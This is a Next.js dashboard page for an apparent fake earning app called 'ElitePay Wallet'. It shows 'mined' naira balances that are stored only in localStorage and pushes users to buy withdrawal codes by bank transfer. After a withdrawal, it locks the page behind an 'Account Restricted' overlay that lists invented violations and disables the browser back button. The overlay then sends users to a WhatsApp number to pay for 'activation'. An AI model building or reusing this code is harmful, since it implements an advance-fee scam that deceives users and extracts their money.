import { useEffect, useState } from 'react';
import { useRouter } from 'next/router';
import Layout from '../components/Layout';
import { loadUser, loadBalance, loadTx } from '../utils/storage';
import { formatNaira } from '../utils/format';

export default function Dashboard() {
  const router = useRouter();
  const [user, setUser] = useState(null);
  const [balance, setBalance] = useState(0);
  const [tx, setTx] = useState([]);
  const [loading, setLoading] = useState(false);
  const [loadingMessage, setLoadingMessage] = useState('Loading dashboard...');
  const [showIntro, setShowIntro] = useState(false);
  const [showWelcome, setShowWelcome] = useState(false);
  const [introIndex, setIntroIndex] = useState(0);
  const [stats, setStats] = useState({ totalMined: 0, totalWithdrawn: 0, txCount: 0 });
  const [restricted, setRestricted] = useState(false);
  const [timeLeft, setTimeLeft] = useState(0);

  const WHATSAPP_LINK = 'https://wa.me/2347085462173?text=Hello%2C%20I%20want%20to%20activate%20my%20ElitePay%20Wallet%20account';

  useEffect(() => {
    const currentUser = loadUser();
    if (!currentUser) {
      router.push('/');
      return;
    }

    setUser(currentUser);
    setBalance(loadBalance());
    const transactions = loadTx() || [];
    setTx(transactions);
    computeStats(transactions);

    try {
      const seenIntro = localStorage.getItem('gt_seen_intro');
      if (!seenIntro) {
        setShowIntro(true);
        localStorage.setItem('gt_seen_intro', '1');
      } else {
        const seenWelcome = localStorage.getItem('gt_seen_welcome');
        if (!seenWelcome) {
          setShowWelcome(true);
          localStorage.setItem('gt_seen_welcome', '1');
          setTimeout(() => setShowWelcome(false), 2200);
        }
      }
    } catch (error) {}
  }, [router]);

  useEffect(() => {
    const check = () => {
      try {
        const activated = localStorage.getItem('gt_activated') === 'true';
        if (activated) {
          setRestricted(false);
          setTimeLeft(0);
          return;
        }

        const end = localStorage.getItem('gt_restriction_end');
        if (!end) {
          setRestricted(false);
          setTimeLeft(0);
          return;
        }

        const remaining = Number(end) - Date.now();
        if (remaining <= 0) {
          setRestricted(true);
          setTimeLeft(0);
        } else {
          setRestricted(false);
          setTimeLeft(remaining);
        }
      } catch (error) {}
    };

    check();
    const interval = setInterval(check, 1000);
    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (!restricted) return;
    const blockBack = () => {
      try {
        window.history.pushState(null, '', window.location.href);
      } catch (error) {}
    };
    blockBack();
    window.addEventListener('popstate', blockBack);
    return () => window.removeEventListener('popstate', blockBack);
  }, [restricted]);

  function computeStats(transactions) {
    const totalMined = transactions
      .filter((item) => item.type === 'mine' && (item.status === 'claimed' || item.status === 'successful'))
      .reduce((sum, item) => sum + Number(item.amount || 0), 0);
    const totalWithdrawn = transactions
      .filter((item) => item.type === 'withdraw_confirm' || (item.type === 'withdraw' && item.status === 'successful'))
      .reduce((sum, item) => sum + Number(item.amount || 0), 0);
    setStats({ totalMined, totalWithdrawn, txCount: transactions.length || 0 });
  }

  const startQuick = (path, message = 'Opening...') => {
    setLoadingMessage(message);
    setLoading(true);
    setTimeout(() => setLoadingMessage('Preparing secure session...'), 400);
    setTimeout(() => router.push(path), 900);
  };

  const copyReferral = async () => {
    const link = `${typeof window !== 'undefined' ? window.location.origin : ''}/register?ref=${user?.phone || ''}`;
    try {
      await navigator.clipboard.writeText(link);
      alert('Referral link copied to clipboard.');
    } catch (error) {
      prompt('Copy this referral link:', link);
    }
  };

  const formatTime = (ms) => {
    const secondsTotal = Math.floor(ms / 1000);
    const minutes = Math.floor(secondsTotal / 60);
    const seconds = secondsTotal % 60;
    return `${minutes}:${seconds.toString().padStart(2, '0')}`;
  };

  if (!user) {
    return (
      <Layout>
        <div className="center">
          <div className="card">Loading dashboard...</div>
        </div>
      </Layout>
    );
  }

  const previewTx = (tx || []).slice(0, 5);
  const firstName = user.fullName?.split(' ')[0] || 'User';
  const initials = user.fullName
    ? user.fullName.split(' ').map((part) => part[0]).slice(0, 2).join('').toUpperCase()
    : 'EP';

  const slides = [
    {
      title: 'Welcome to ElitePay Wallet',
      subtitle: 'Safe. Fast. Rewarding.',
      body: 'ElitePay Wallet gives you a Pulse Miner, transaction history, code purchase flow, and secure withdrawal controls.',
      icon: 'EP',
    },
    {
      title: 'How to earn',
      subtitle: 'Simple wallet flow',
      body: 'Tap Mine to start Pulse Miner, wait for verification, claim the reward, then withdraw securely with a code.',
      icon: '01',
    },
  ];

  return (
    <Layout title="Dashboard - ElitePay Wallet">
      <style>{`
        .dash-shell {
          display: grid;
          gap: 18px;
          padding-bottom: 22px;
        }

        .restriction-banner {
          display: flex;
          justify-content: space-between;
          gap: 14px;
          align-items: center;
          border-color: rgba(239, 68, 68, 0.22);
          background: #fff8f8;
        }

        .dash-hero {
          display: grid;
          grid-template-columns: minmax(0, 1.1fr) minmax(290px, 0.9fr);
          gap: 18px;
          align-items: stretch;
        }

        .balance-card {
          position: relative;
          overflow: hidden;
          min-height: 310px;
          padding: 28px;
          color: #ffffff;
          background:
            radial-gradient(circle at 80% 10%, rgba(25, 185, 167, 0.35), transparent 32%),
            linear-gradient(135deg, #102033, #0f5f48);
        }

        .balance-card::after {
          content: "";
          position: absolute;
          width: 220px;
          height: 220px;
          right: -80px;
          bottom: -90px;
          border-radius: 50%;
          border: 38px solid rgba(255, 255, 255, 0.08);
        }

        .dash-eyebrow {
          display: inline-flex;
          width: fit-content;
          padding: 7px 10px;
          border-radius: 999px;
          background: rgba(255, 255, 255, 0.12);
          color: rgba(255, 255, 255, 0.82);
          font-size: 12px;
          font-weight: 900;
          margin-bottom: 14px;
        }

        .balance-label {
          color: rgba(255, 255, 255, 0.72);
          font-size: 13px;
          font-weight: 800;
        }

        .balance-value {
          margin: 6px 0;
          font-size: clamp(36px, 6vw, 58px);
          line-height: 1;
          font-weight: 950;
        }

        .balance-meta {
          color: rgba(255, 255, 255, 0.72);
          max-width: 520px;
        }

        .dash-actions {
          display: flex;
          flex-wrap: wrap;
          gap: 10px;
          margin-top: 24px;
          position: relative;
          z-index: 1;
        }

        .balance-card .btnGhost {
          color: #ffffff;
          background: rgba(255, 255, 255, 0.10);
          border-color: rgba(255, 255, 255, 0.20);
        }

        .profile-card {
          display: grid;
          align-content: space-between;
          gap: 18px;
        }

        .profile-top {
          display: flex;
          gap: 14px;
          align-items: center;
        }

        .profile-avatar {
          width: 64px;
          height: 64px;
          display: grid;
          place-items: center;
          border-radius: 8px;
          color: #ffffff;
          background: linear-gradient(135deg, #0f9f6e, #19b9a7);
          font-size: 22px;
          font-weight: 950;
        }

        .profile-name {
          margin: 0;
          color: #102033;
          font-size: 22px;
          font-weight: 950;
        }

        .profile-details {
          display: grid;
          gap: 10px;
        }

        .detail-row {
          display: flex;
          justify-content: space-between;
          gap: 12px;
          padding: 11px 0;
          border-top: 1px solid #edf3f8;
        }

        .stat-grid {
          display: grid;
          grid-template-columns: repeat(3, minmax(0, 1fr));
          gap: 12px;
        }

        .stat-card {
          padding: 18px;
          border-radius: 8px;
          background: #ffffff;
          border: 1px solid #dbe6f3;
          box-shadow: 0 14px 32px rgba(16, 32, 51, 0.07);
        }

        .stat-card small {
          color: #64748b;
          font-weight: 850;
        }

        .stat-card strong {
          display: block;
          margin-top: 8px;
          color: #102033;
          font-size: 22px;
          font-weight: 950;
        }

        .dashboard-grid {
          display: grid;
          grid-template-columns: 0.82fr 1.18fr;
          gap: 18px;
          align-items: start;
        }

        .tool-grid {
          display: grid;
          gap: 10px;
        }

        .tool-button {
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 12px;
          width: 100%;
          padding: 14px;
          border: 1px solid #dbe6f3;
          border-radius: 8px;
          background: #ffffff;
          color: #102033;
          text-align: left;
          cursor: pointer;
        }

        .tool-button:hover {
          background: #f5fbf8;
          border-color: rgba(15, 159, 110, 0.30);
        }

        .tool-button span {
          color: #64748b;
          font-size: 12px;
          display: block;
          margin-top: 2px;
        }

        .section-head {
          display: flex;
          align-items: center;
          justify-content: space-between;
          gap: 12px;
          margin-bottom: 12px;
        }

        .section-head h2 {
          margin: 0;
          color: #102033;
          font-size: 20px;
          font-weight: 950;
        }

        .tx-list {
          display: grid;
          gap: 10px;
        }

        .tx-empty {
          padding: 24px;
          text-align: center;
          border: 1px dashed #cbd5e1;
          border-radius: 8px;
          background: #f8fafc;
        }

        .tx-item {
          display: flex;
          justify-content: space-between;
          gap: 14px;
          padding: 14px;
          border: 1px solid #dbe6f3;
          border-radius: 8px;
          background: #ffffff;
        }

        .tx-type {
          color: #102033;
          font-weight: 950;
          text-transform: capitalize;
        }

        .status-pill {
          display: inline-flex;
          padding: 4px 8px;
          border-radius: 999px;
          background: #edf3f8;
          color: #64748b;
          font-size: 12px;
          font-weight: 850;
        }

        .status-pill.success {
          background: #e9f8f2;
          color: #077a55;
        }

        .lock-overlay {
          position: fixed;
          inset: 0;
          z-index: 9999;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 20px;
          background: rgba(16, 32, 51, 0.46);
          backdrop-filter: blur(8px);
          -webkit-backdrop-filter: blur(8px);
        }

        .lock-card {
          width: min(540px, 94vw);
        }

        .lock-card h2 {
          text-align: center;
        }

        .restriction-reasons {
          display: grid;
          gap: 8px;
          margin: 16px 0;
          padding: 0;
          list-style: none;
          text-align: left;
        }

        .restriction-reasons li {
          display: grid;
          grid-template-columns: 28px 1fr;
          gap: 9px;
          align-items: start;
          padding: 10px;
          border-radius: 8px;
          background: #fff8f8;
          border: 1px solid rgba(239, 68, 68, 0.14);
          color: #334155;
          font-size: 13px;
          font-weight: 750;
        }

        .restriction-reasons span {
          width: 24px;
          height: 24px;
          display: grid;
          place-items: center;
          border-radius: 8px;
          background: #fee2e2;
          color: #b42318;
          font-size: 12px;
          font-weight: 950;
        }

        .intro-slide-head {
          display: flex;
          justify-content: space-between;
          gap: 12px;
          align-items: center;
        }

        .slide-icon {
          width: 44px;
          height: 44px;
          display: grid;
          place-items: center;
          border-radius: 8px;
          background: #e9f8f2;
          color: #077a55;
          font-weight: 950;
        }

        @media (max-width: 900px) {
          .dash-hero,
          .dashboard-grid {
            grid-template-columns: 1fr;
          }

          .stat-grid {
            grid-template-columns: repeat(2, minmax(0, 1fr));
          }
        }

        @media (max-width: 640px) {
          .balance-card {
            min-height: auto;
            padding: 22px 16px;
          }

          .stat-grid {
            grid-template-columns: 1fr;
          }

          .tx-item,
          .detail-row,
          .restriction-banner {
            flex-direction: column;
            align-items: flex-start;
          }
        }
      `}</style>

      {restricted && (
        <div className="lock-overlay" role="dialog" aria-modal="true">
          <div className="card lock-card">
            <h2 style={{ marginTop: 0 }}>Account Restricted</h2>
            <p className="small muted">
              Dear <strong>{user.fullName}</strong>, your recent withdrawal was processed. Activate your account to continue using ElitePay safely.
            </p>
            <ol className="restriction-reasons">
              <li><span>1</span>Accessing the website again after a completed withdrawal.</li>
              <li><span>2</span>Incorrect account name or phone number on the withdrawal request.</li>
              <li><span>3</span>Making double withdrawal requests at the same time.</li>
              <li><span>4</span>Using one activation code to withdraw from a different account.</li>
            </ol>
            <button className="btn" style={{ width: '100%' }} onClick={() => { window.location.href = WHATSAPP_LINK; }}>
              Activate Account
            </button>
          </div>
        </div>
      )}

      <div className="dash-shell">
        <section className="dash-hero">
          <div className="card balance-card">
            <div className="dash-eyebrow">ElitePay Dashboard</div>
            <div className="balance-label">Wallet Balance</div>
            <div className="balance-value">{formatNaira(balance)}</div>
            <div className="balance-meta">{firstName}, your wallet is ready. Use Pulse Miner, buy a code, or continue to withdrawal.</div>
            <div className="dash-actions">
              <button className="btn" onClick={() => startQuick('/mine', 'Preparing Pulse Miner...')}>Mine</button>
              <button className="btnGhost" onClick={() => startQuick('/withdraw', 'Opening withdraw...')} disabled={restricted}>Withdraw</button>
              <button className="btnGhost" onClick={() => startQuick('/buy-code', 'Opening code purchase...')} disabled={restricted}>Buy Code</button>
            </div>
          </div>

          <aside className="card profile-card">
            <div className="profile-top">
              <div className="profile-avatar">{initials}</div>
              <div>
                <h1 className="profile-name">{user.fullName}</h1>
                <div className="small muted">{user.phone}</div>
              </div>
            </div>
            <div className="profile-details">
              <div className="detail-row">
                <span className="small muted">Plan</span>
                <strong>{user.plan || 'Pulse Miner'}</strong>
              </div>
              <div className="detail-row">
                <span className="small muted">Referral</span>
                <strong>{user.referral || 'Not set'}</strong>
              </div>
              <div className="dash-actions" style={{ marginTop: 0 }}>
                <button className="btnGhost" onClick={() => router.push('/profile')}>Edit Profile</button>
                <button className="btnGhost" onClick={copyReferral}>Share Referral</button>
              </div>
            </div>
          </aside>
        </section>

        <section className="stat-grid">
          <div className="stat-card">
            <small>Total Mined</small>
            <strong>{formatNaira(stats.totalMined)}</strong>
          </div>
          <div className="stat-card">
            <small>Total Withdrawn</small>
            <strong>{formatNaira(stats.totalWithdrawn)}</strong>
          </div>
          <div className="stat-card">
            <small>Transactions</small>
            <strong>{stats.txCount}</strong>
          </div>
        </section>

        <section className="dashboard-grid">
          <aside className="card">
            <div className="section-head">
              <h2>Quick Tools</h2>
            </div>
            <div className="tool-grid">
              <button className="tool-button" onClick={() => startQuick('/buy-code', 'Opening code purchase...')}>
                <strong>Buy withdrawal code<span>Prepare bank-transfer checkout</span></strong>
                <span>Open</span>
              </button>
              <button className="tool-button" onClick={() => startQuick('/history', 'Loading transactions...')}>
                <strong>Full history<span>Review receipts and transactions</span></strong>
                <span>Open</span>
              </button>
              <button
                className="tool-button"
                onClick={() => { navigator.share ? navigator.share({ title: 'ElitePay Wallet', text: 'Join me on ElitePay Wallet', url: window.location.href }) : copyReferral(); }}
              >
                <strong>Share app<span>Send your ElitePay link</span></strong>
                <span>Share</span>
              </button>
            </div>
          </aside>

          <div className="card">
            <div className="section-head">
              <h2>Recent Transactions</h2>
              <button className="btnGhost" onClick={() => startQuick('/history', 'Loading transactions...')}>View all</button>
            </div>

            <div className="tx-list">
              {previewTx.length === 0 && (
                <div className="tx-empty small muted">No transactions yet. Start mining to create your first wallet record.</div>
              )}
              {previewTx.map((item) => {
                const successful = item.status === 'successful' || item.status === 'claimed';
                return (
                  <article className="tx-item" key={item.id || item.created_at || Math.random()}>
                    <div>
                      <div className="tx-type">{String(item.type || 'transaction').replace(/_/g, ' ')}</div>
                      <div className="small muted">{item.created_at ? new Date(item.created_at).toLocaleString() : 'Unknown date'}</div>
                    </div>
                    <div style={{ textAlign: 'right' }}>
                      <strong>{formatNaira(item.amount)}</strong>
                      <div style={{ marginTop: 6 }}>
                        <span className={`status-pill ${successful ? 'success' : ''}`}>{item.status || 'pending'}</span>
                      </div>
                    </div>
                  </article>
                );
              })}
            </div>
          </div>
        </section>
      </div>

      {showIntro && (
        <div className="introOverlay" role="dialog" aria-modal="true">
          <div className="introBox card">
            <div className="intro-slide-head">
              <div style={{ display: 'flex', gap: 12, alignItems: 'center' }}>
                <div className="slide-icon">{slides[introIndex].icon}</div>
                <div>
                  <div style={{ fontWeight: 950 }}>{slides[introIndex].title}</div>
                  <div className="small muted">{slides[introIndex].subtitle}</div>
                </div>
              </div>
              <button className="btnGhost" onClick={() => setShowIntro(false)}>Skip</button>
            </div>

            <p className="small muted" style={{ minHeight: 58 }}>{slides[introIndex].body}</p>

            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 12 }}>
              <div>
                {slides.map((slide, index) => (
                  <span key={slide.title} className={`dot ${index === introIndex ? 'active' : ''}`} onClick={() => setIntroIndex(index)} />
                ))}
              </div>
              <div style={{ display: 'flex', gap: 8 }}>
                {introIndex > 0 && <button className="btnGhost" onClick={() => setIntroIndex((index) => index - 1)}>Back</button>}
                <button className="btn" onClick={() => (introIndex < slides.length - 1 ? setIntroIndex((index) => index + 1) : (setShowIntro(false), setShowWelcome(true), setTimeout(() => setShowWelcome(false), 2000)))}>
                  {introIndex === slides.length - 1 ? 'Finish' : 'Next'}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {showWelcome && (
        <div className="welcomeOverlay" role="dialog" aria-modal="true">
          <div className="welcomeBox card">
            <div style={{ display: 'flex', gap: 12, alignItems: 'center' }}>
              <div className="slide-icon">EP</div>
              <div>
                <div style={{ fontWeight: 950, fontSize: 18 }}>Welcome, {firstName}</div>
                <div className="small muted">Your wallet is ready. Current balance {formatNaira(balance)}</div>
              </div>
            </div>
          </div>
        </div>
      )}

      {loading && (
        <div className="loadingOverlay" role="status" aria-live="polite">
          <div className="loadingBox">
            <div className="loader" aria-hidden="true">
              <span className="ring" />
              <span className="ring ring2" />
              <span className="spark" />
            </div>
            <div>
              <div className="loaderText">{loadingMessage}</div>
              <div className="small muted" style={{ marginTop: 6 }}>One moment please...</div>
            </div>
          </div>
        </div>
      )}
    </Layout>
  );
}
